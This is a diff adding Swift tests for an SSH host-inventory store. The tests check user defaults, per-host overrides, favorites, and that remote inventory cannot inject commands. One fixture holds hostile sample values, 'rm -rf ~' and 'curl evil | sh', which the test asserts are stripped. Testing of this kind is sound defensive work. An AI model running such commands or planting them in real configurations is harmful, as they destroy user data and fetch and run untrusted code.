@@ -126,6 +126,92 @@ private func makeTempDir() -> URL {
     #expect(hosts[2].command == "ssh 'deploy@web01'") // no remote command → plain connect
 }
 
+@Test func remoteDecodeStripsCommandsAndUsesDefaultUser() throws {
+    // A remote source provides inventory only: `command` and `remoteCommand`
+    // must never be honored, and the login user comes from the default.
+    let json = """
+    {
+      "groups": [{
+        "name": "g",
+        "hosts": [
+          { "name": "plain", "host": "web01" },
+          { "name": "evil-raw", "command": "rm -rf ~" },
+          { "name": "evil-remote", "host": "web02", "remoteCommand": "curl evil | sh" }
+        ]
+      }]
+    }
+    """
+    let hosts = try JSONHostStore.decode(Data(json.utf8), defaultUser: "deploy", allowCommands: false).first!.hosts
+    #expect(hosts[0].command == "ssh 'deploy@web01'")
+    // The raw command is ignored — it becomes a plain connect to the name as host.
+    #expect(hosts[1].command == "ssh 'deploy@evil-raw'")
+    #expect(!hosts[1].command.contains("rm -rf"))
+    // The remote command is dropped (no `-t`, no appended command).
+    #expect(hosts[2].command == "ssh 'deploy@web02'")
+    #expect(!hosts[2].command.contains("curl"))
+}
+
+@Test func remoteFavoritesAreAppliedByHostKey() throws {
+    let json = """
+    { "groups": [{ "name": "g", "hosts": [
+        { "name": "a", "host": "web01" },
+        { "name": "b", "host": "db", "port": 2222 }
+    ]}]}
+    """
+    let favKey = RemoteUserOverrides.key(host: "db", port: 2222)
+    let hosts = try JSONHostStore.decode(Data(json.utf8), allowCommands: false, favoriteKeys: [favKey]).first!.hosts
+    #expect(hosts[0].favorite == false)
+    #expect(hosts[1].favorite == true)
+    #expect(hosts[1].favoriteKey == favKey)
+}
+
+@Test func remoteUserOverrideWinsAndIsKeyedByHostPort() throws {
+    let json = """
+    {
+      "groups": [{
+        "name": "g",
+        "hosts": [
+          { "name": "a", "host": "web01" },
+          { "name": "b", "host": "db", "port": 2222 }
+        ]
+      }]
+    }
+    """
+    let overrides = [
+        RemoteUserOverrides.key(host: "web01", port: nil): "alice",
+        RemoteUserOverrides.key(host: "db", port: 2222): "bob",
+    ]
+    let hosts = try JSONHostStore.decode(Data(json.utf8), defaultUser: "deploy",
+                                         allowCommands: false, userOverrides: overrides).first!.hosts
+    #expect(hosts[0].command == "ssh 'alice@web01'")     // override beats the default user
+    #expect(hosts[1].command == "ssh -p 2222 'bob@db'")  // keyed by host:port
+}
+
+@Test func jsonAppliesDefaultUserUnlessOverridden() throws {
+    let dir = makeTempDir(); defer { try? FileManager.default.removeItem(at: dir) }
+    let url = dir.appendingPathComponent("servers.json")
+    let file = JSONHostStore.File(
+        groups: [.init(name: "g", hosts: [
+            .init(name: "inherits", host: "web01", user: nil, port: nil, command: nil, remoteCommand: nil),
+            .init(name: "override", host: "web02", user: "root", port: nil, command: nil, remoteCommand: nil),
+            .init(name: "raw", host: nil, user: nil, port: nil, command: "ssh -J jump h", remoteCommand: nil),
+        ])],
+        hosts: nil
+    )
+    try JSONHostStore.write(file, to: url)
+
+    // No default user → an entry without a user connects without one.
+    let plain = try JSONHostStore.load(from: url).first!.hosts
+    #expect(plain[0].command == "ssh 'web01'")
+
+    // A default user fills in only where no explicit user is set; an explicit
+    // user wins and a raw command is left untouched.
+    let withDefault = try JSONHostStore.load(from: url, defaultUser: "deploy").first!.hosts
+    #expect(withDefault[0].command == "ssh 'deploy@web01'")
+    #expect(withDefault[1].command == "ssh 'root@web02'")
+    #expect(withDefault[2].command == "ssh -J jump h")
+}
+
 @Test func favoritesPersistAndToggle() throws {
     let dir = makeTempDir(); defer { try? FileManager.default.removeItem(at: dir) }
     let url = dir.appendingPathComponent("servers.json")
